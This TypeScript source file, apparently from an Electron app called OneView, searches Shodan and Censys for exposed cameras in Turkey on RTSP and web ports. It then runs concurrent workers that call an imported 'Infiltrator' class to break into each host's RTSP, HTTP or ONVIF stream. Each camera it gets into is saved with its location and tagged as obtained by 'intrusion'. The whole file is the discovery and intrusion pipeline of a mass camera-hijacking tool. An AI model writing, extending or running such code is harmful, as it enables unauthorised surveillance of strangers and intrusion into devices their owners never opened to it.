import * as fs from 'fs';
import * as path from 'path';
import { app } from 'electron';
import { RegisteredCamera, CamProtocol, hashId } from './registry';
import { Infiltrator } from './intrusion';

export function shodanKey(): string {
  const env = process.env.SHODAN_API_KEY || process.env.ONEVIEW_SHODAN_KEY;
  if (env && env.trim()) return env.trim();
  try {
    const file = path.join(app.getPath('userData'), 'config.json');
    if (fs.existsSync(file)) {
      const cfg = JSON.parse(fs.readFileSync(file, 'utf-8'));
      if (cfg && typeof cfg.shodanKey === 'string' && cfg.shodanKey.trim()) return cfg.shodanKey.trim();
    }
  } catch {
    /* ignore */
  }
  return '';
}

export function censysToken(): string {
  const env = process.env.CENSYS_TOKEN || process.env.ONEVIEW_CENSYS_TOKEN;
  if (env && env.trim()) return env.trim();
  try {
    const file = path.join(app.getPath('userData'), 'config.json');
    if (fs.existsSync(file)) {
      const cfg = JSON.parse(fs.readFileSync(file, 'utf-8'));
      if (cfg && typeof cfg.censysToken === 'string' && cfg.censysToken.trim()) return cfg.censysToken.trim();
    }
  } catch {
    /* ignore */
  }
  return '';
}

const SHODAN_QUERIES = [
  'country:TR port:554',
  'country:TR port:8554',
  'country:TR port:8080 has_screenshot:true',
  'country:TR port:81 has_screenshot:true',
];

interface Host {
  ip: string;
  port: number;
  lat: number;
  lon: number;
}

export async function shodanHosts(apiKey: string): Promise<Host[]> {
  const seen = new Set<string>();
  const out: Host[] = [];
  if (!apiKey) return out;

  for (const q of SHODAN_QUERIES) {
    try {
      const url =
        `https://api.shodan.io/shodan/host/search?key=${encodeURIComponent(apiKey)}` +
        `&query=${encodeURIComponent(q)}&minify=true`;
      const res = await fetch(url, { headers: { Accept: 'application/json' } });
      if (!res.ok) continue;
      const data = (await res.json()) as {
        matches?: Array<{ ip_str?: string; port?: number; location?: { latitude?: number; longitude?: number } }>;
      };
      for (const m of data?.matches || []) {
        const ip = m.ip_str;
        const port = m.port;
        if (!ip || !port) continue;
        const key = `${ip}:${port}`;
        if (seen.has(key)) continue;
        seen.add(key);
        out.push({
          ip,
          port,
          lat: m.location?.latitude ?? 0,
          lon: m.location?.longitude ?? 0,
        });
      }
    } catch {
      /* ignore query */
    }
  }
  return out;
}

export async function censysHosts(token: string): Promise<Host[]> {
  const out: Host[] = [];
  if (!token) return out;
  try {
    const url = 'https://search.censys.io/api/v2/hosts/search?q=' + encodeURIComponent('location.country: Turkey AND services.port: 554');
    const res = await fetch(url, { headers: { Accept: 'application/json', Authorization: `Bearer ${token}` } });
    if (!res.ok) return out;
    const data = (await res.json()) as {
      result?: { hits?: Array<{ ip?: string; location?: { coordinates?: { latitude?: number; longitude?: number } } }> };
    };
    for (const h of data?.result?.hits || []) {
      const ip = h.ip;
      if (!ip) continue;
      out.push({
        ip,
        port: 554,
        lat: h.location?.coordinates?.latitude ?? 0,
        lon: h.location?.coordinates?.longitude ?? 0,
      });
    }
  } catch {
    /* ignore */
  }
  return out;
}

export async function reachCameras(hosts: Host[], maxHosts = 400, timeoutMs = 2000): Promise<RegisteredCamera[]> {
  const inf = new Infiltrator(timeoutMs);
  const slice = hosts.slice(0, maxHosts);
  const out: RegisteredCamera[] = [];
  let idx = 0;

  const workers = Array.from({ length: 12 }, async () => {
    while (idx < slice.length) {
      const h = slice[idx++];
      try {
        let access =
          h.port === 554 || h.port === 8554
            ? await inf.accessRtsp(h.ip, h.port)
            : await inf.accessHttp(h.ip, h.port);
        if (!access && (h.port === 80 || h.port === 8080 || h.port === 81)) {
          access = await inf.accessOnvif(h.ip, h.port);
        }
        if (!access) continue;
        out.push({
          id: hashId(access.url),
          name: `${h.ip}:${h.port}`,
          il: '',
          ilce: '',
          lat: h.lat,
          lon: h.lon,
          protocol: access.protocol as CamProtocol,
          url: access.url,
          status: 'online',
          source: 'intrusion',
          lastSeen: Date.now(),
          latencyMs: null,
        });
      } catch {
        /* skip host */
      }
    }
  });
  await Promise.all(workers);
  return out;
}
